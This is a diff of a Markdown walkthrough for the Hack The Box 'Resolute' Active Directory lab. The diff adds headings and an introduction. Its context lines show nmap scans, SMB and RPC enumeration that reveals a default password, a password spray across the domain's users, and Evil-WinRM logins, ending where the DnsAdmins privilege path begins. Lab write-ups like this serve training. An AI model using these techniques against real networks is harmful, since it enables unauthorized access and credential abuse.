@@ -1,4 +1,17 @@
-Nmap Scan
+# Hack The Box - Resolute Walkthrough 
+
+The [Resolute](https://app.hackthebox.com/machines/Resolute) machine is a medium Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as it showed how to get high privileges using DnsAdmins permissions.
+
+
+If you didn’t solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
+
+## Reconnaissance
+In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.
+
+This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address.
+
+
+### Nmap Scan
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -64,7 +77,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 66.83 seconds
 ```
 
-Rustscan
+### Rustscan
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -165,7 +178,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
 ```
 
-Enumerating SMB service (Crackmapexec)
+### Enumerating SMB service (Crackmapexec)
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -176,7 +189,7 @@ SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Stan
 └─$ crackmapexec smb 10.10.10.169 --shares
 SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.169    445    RESOLUTE         [-] Error enumerating shares: SMB SessionError: 0x5b
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+                                                                                
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
 └─$ crackmapexec smb 10.10.10.169 -u '' -p ''
 SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
@@ -211,7 +224,7 @@ SMB         10.10.10.169    445    RESOLUTE         Account Lockout Threshold: N
 SMB         10.10.10.169    445    RESOLUTE         Forced Log off Time: Not Set
 ```
 
-RPCclient
+### RPCclient
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -348,7 +361,7 @@ rpcclient $> queryuser 0x457
 
 Here, I got the password for the user Marko - `Welcome123!`
 
-Tried logging in using the credentials `marko:Welcome123!` but it failed.
+### Tried logging in using the credentials `marko:Welcome123!` but it failed.
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -378,7 +391,7 @@ Error: An error of type Errno::ECONNREFUSED happened, message is Connection refu
 Error: Exiting with code 1
 ```
 
-Simple script to exact just the user name using `awk`
+### Simple script to exact just the user name using `awk`
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -447,7 +460,7 @@ SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Wel
 SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\:Welcome123! STATUS_LOGON_FAILURE
 ```
 
-Tried logging in as `melanie` and it worked
+### Tried logging in as `melanie` and it worked
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -465,7 +478,7 @@ Info: Establishing connection to remote endpoint
 megabank\melanie
 ```
 
-User flag
+### User flag
 
 ```bash
 *Evil-WinRM* PS C:\Users\melanie> cd Desktop
@@ -481,7 +494,7 @@ Mode                LastWriteTime         Length Name
 ...SNIP...
 ```
 
-Looking through hidden files in the `C:\` directory, found this `PSTranscripts` 
+### Looking through hidden files in the `C:\` directory, found this `PSTranscripts` 
 
 ```bash
 *Evil-WinRM* PS C:\> ls -force
@@ -679,7 +692,7 @@ melanie
 The command completed successfully.
 ```
 
-So i tried to `EvilWinRM` using `ryan's` credentials and I was able to login
+### So i tried to `EvilWinRM` using `ryan's` credentials and I was able to login
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
@@ -752,7 +765,6 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 The [`Microsoft Documentation`](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins) describes this `DnsAdmins` as:
 
 > Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.
-> 
 
 ### Vulnerability
 
